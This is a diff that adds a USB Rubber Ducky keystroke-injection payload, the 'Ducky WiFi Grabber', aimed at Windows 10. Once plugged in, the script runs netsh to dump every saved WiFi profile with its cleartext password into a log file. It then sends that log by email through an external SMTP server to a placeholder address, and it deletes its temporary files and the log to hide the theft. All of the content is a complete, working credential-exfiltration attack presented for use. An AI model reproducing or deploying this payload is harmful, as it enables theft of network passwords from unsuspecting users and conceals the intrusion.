@@ -1,0 +1,87 @@
+REM Title:         Ducky WiFi Grabber
+REM Description:   Steals wifi passwords and sends them to test@domain.com
+REM Author:        Zero_Sploit (adjusted by Ublec01d)
+REM Version:       2.0
+REM Category:      Exfiltration
+REM Target:        Windows 10 (CMD + Powershell)
+REM Attackmodes:   HID
+REM Open Cmd
+DELAY 1000
+WINDOWS r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+REM Get all SSID
+STRING cd %USERPROFILE% & netsh wlan show profiles | findstr "All" > a.txt
+ENTER
+REM Create a filter.bat to get all the profile names
+STRING echo SETLOCAL EnableDelayedExpansion^
+ENTER
+ENTER
+STRING for /f "tokens=5*" %%i in (a.txt) do (^
+ENTER
+ENTER
+STRING set val=%%i %%j^
+ENTER
+ENTER
+STRING if "!val:~-1!" == " " set val=!val:~0,-1!^
+ENTER
+ENTER
+STRING echo !val!^>^>b.txt) > filter.bat
+ENTER
+REM Run filter.bat and save all profile names in b.txt
+STRING filter.bat
+DELAY 300
+ENTER
+REM --> Save all the LOOT in Log.txt and delete the other files
+STRING (for /f "tokens=*" %i in (b.txt) do @echo     SSID: %i & netsh wlan show profiles name="%i" key=clear | findstr /c:"Key Content" & echo.) > Log.txt
+ENTER
+DELAY 1000
+STRING exit
+DELAY 500
+ENTER
+DELAY 1000
+REM Mail Log.txt
+WINDOWS r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+STRING del .\a.txt
+ENTER
+STRING del .\b.txt
+ENTER
+STRING del .\filter.bat
+ENTER
+REM Email The Log.txt file
+STRING $SMTPServer = 'smtp-mail.outlook.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSSL = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('test@domain.com', 'PASSWORD')
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = 'test@domain.com'
+ENTER
+STRING $ReportEmail.To.Add('test@domain.com')
+ENTER
+STRING $ReportEmail.Subject = 'wifi-loot'
+ENTER
+STRING $ReportEmail.Body = (Get-Content Log.txt | out-string)
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+REM Delete Log.txt and exit
+DELAY 3000
+STRING del Log.txt
+DELAY 500
+ENTER
+STRING echo - - - Thank_you_for_sharing - - - Ublec01d -
+ENTER
+DELAY 500
+STRING exit
+ENTER
